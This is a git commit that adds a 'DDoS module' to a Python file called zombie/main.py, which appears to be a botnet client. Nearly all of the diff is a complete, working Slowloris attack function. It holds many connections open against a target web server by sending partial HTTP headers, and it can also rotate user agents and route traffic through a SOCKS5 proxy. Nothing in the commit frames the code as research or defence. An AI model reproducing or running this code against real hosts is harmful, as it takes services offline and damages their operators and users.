41d5f2e1a599afce5751454ab086867d11ea87b0
UsboKirishima <usbertibox@gmail.com>
2024-10-21 21:33:11 +0200

    feat(zombie): add slowloris as DDos module to zombie exploit
    Co-authored-by: Gokberk Yaltirakli <gkbrk@users.noreply.github.com>

--- zombie/main.py
+++ zombie/main.py
@@ -5,6 +5,12 @@ import json
 import time
 import base64
 
+import logging
+import random
+import socket
+import sys
+import time
+
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization
@@ -33,6 +39,144 @@ def import_public_key(pem_data):
     return serialization.load_pem_public_key(pem_data.encode('utf-8'))
 
 private_key, public_key = generate_key_pair()
+
+
+# DDoS Module
+# ----------------
+
+def slowloris(host, port=80, sockets=150, verbose=False, randuseragent=False, useproxy=False, proxy_host="127.0.0.1", proxy_port=8080, https=False, sleeptime=15):
+    if useproxy:
+        try:
+            import socks
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
+            socket.socket = socks.socksocket
+            logging.info("Using SOCKS5 proxy for connecting...")
+        except ImportError:
+            logging.error("Socks Proxy Library Not Available!")
+            return
+
+    logging.basicConfig(
+        format="[%(asctime)s] %(message)s",
+        datefmt="%d-%m-%Y %H:%M:%S",
+        level=logging.DEBUG if verbose else logging.INFO,
+    )
+
+    def send_line(self, line):
+        line = f"{line}\r\n"
+        self.send(line.encode("utf-8"))
+
+    def send_header(self, name, value):
+        self.send_line(f"{name}: {value}")
+
+    if https:
+        logging.info("Importing ssl module")
+        import ssl
+        setattr(ssl.SSLSocket, "send_line", send_line)
+        setattr(ssl.SSLSocket, "send_header", send_header)
+
+    setattr(socket.socket, "send_line", send_line)
+    setattr(socket.socket, "send_header", send_header)
+
+    user_agents = [
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    ]
+
+    list_of_sockets = []
+
+    def init_socket(ip):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+
+        if https:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=host)
+
+        s.connect((ip, port))
+
+        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+
+        ua = user_agents[0]
+        if randuseragent:
+            ua = random.choice(user_agents)
+
+        s.send_header("User-Agent", ua)
+        s.send_header("Accept-language", "en-US,en,q=0.5")
+        return s
+
+    def slowloris_iteration():
+        logging.info("Sending keep-alive headers...")
+        logging.info("Socket count: %s", len(list_of_sockets))
+
+        for s in list(list_of_sockets):
+            try:
+                s.send_header("X-a", random.randint(1, 5000))
+            except socket.error:
+                list_of_sockets.remove(s)
+
+        diff = sockets - len(list_of_sockets)
+        if diff <= 0:
+            return
+
+        logging.info("Creating %s new sockets...", diff)
+        for _ in range(diff):
+            try:
+                s = init_socket(host)
+                if not s:
+                    continue
+                list_of_sockets.append(s)
+            except socket.error as e:
+                logging.debug("Failed to create new socket: %s", e)
+                break
+
+    logging.info("Attacking %s with %s sockets.", host, sockets)
+
+    logging.info("Creating sockets...")
+    for _ in range(sockets):
+        try:
+            s = init_socket(host)
+        except socket.error as e:
+            logging.debug(e)
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        try:
+            slowloris_iteration()
+        except (KeyboardInterrupt, SystemExit):
+            logging.info("Stopping Slowloris")
+            break
+        except Exception as e:
+            logging.debug("Error in Slowloris iteration: %s", e)
+        logging.debug("Sleeping for %d seconds", sleeptime)
+        time.sleep(sleeptime)
+
+# End DDos Module
 
 @sio.event
 def public_key_received(data):
